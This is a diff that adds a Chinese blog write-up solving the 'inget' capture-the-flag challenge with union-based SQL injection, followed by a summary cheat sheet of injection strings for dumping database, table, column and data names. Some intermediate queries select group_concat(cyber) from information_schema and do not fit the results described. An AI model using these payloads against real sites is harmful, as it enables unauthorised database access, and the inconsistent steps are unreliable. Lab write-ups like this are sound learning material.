@@ -91,7 +91,34 @@
     
     <div class="e-content article-entry" itemprop="articleBody">
       
-        <p>y</p>
+        <p><a href="">1.做题</a></p>
+<p><a href="">2.总结</a></p>
+<p><strong>1.1攻防世界inget</strong>:</p>
+<p>​     开启环境，看到一串英文提示，翻译过来为：请输入id,再尝试绕过。尝试sql注入。</p>
+<p><img src="/imgs/$%7Bfiilename%7D/QQ20250124-233929.png"></p>
+<p>​     首先判断字段。经过1,2和2,3之间的判断，可看到输入以下代码时有如下回显。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?id=<span class="number">1</span><span class="string">&#x27; union select 2,3--+</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/imgs/$%7Bfiilename%7D/QQ20250124-234625.png"></p>
+<p>​     接着爆数据库。如下图，数据库名为cyber.</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?id=<span class="number">1</span><span class="string">&#x27; union select 2,database()--+</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/imgs/$%7Bfiilename%7D/QQ20250124-235300.png"></p>
+<p>​     爆数据库表名。如下表名也是cyber.</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?id=<span class="number">1</span><span class="string">&#x27; union select 2,group_concat(cyber) from information_schema.tables where table_schema=database()--+</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/imgs/$%7Bfiilename%7D/QQ20250124-235440.png"></p>
+<p>​     查询表名下的列名。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?id=<span class="number">1</span><span class="string">&#x27; union select 2,group_concat(cyber) from information_schema.columns where table_name=&#x27;</span>cyber<span class="string">&#x27;--+</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/imgs/$%7Bfiilename%7D/QQ20250125-000021.png">       </p>
+<p>​     查询字段，尝试后只有pw下，有正确的flag.</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?id=<span class="number">1</span><span class="string">&#x27; union select 2,group_concat(cyber) from cyber--+</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/imgs/$%7Bfiilename%7D/QQ20250125-000413.png"></p>
+<p><strong>2.1总结</strong>:sql注入之联合查询</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">爆数据库:  -<span class="number">1</span><span class="string">&#x27; union select 1,2,3,database()--+</span></span><br><span class="line"><span class="string">爆数据库表名：-1&#x27;</span> union select <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="title function_ invoke__">group_concat</span>(table_name) <span class="keyword">from</span> information_schema.tables where table_schema=<span class="title function_ invoke__">database</span>()--+</span><br><span class="line">爆列名;    -<span class="number">1</span><span class="string">&#x27; union select 1,2,3,group_concat(column_name) from information_schema.columns where table_name=&#x27;</span>表名‘--+</span><br><span class="line">爆数据：  -<span class="number">1</span><span class="string">&#x27; union select 1,2,3,列名 from 表名</span></span><br></pre></td></tr></table></figure>
+
 
       
     </div>
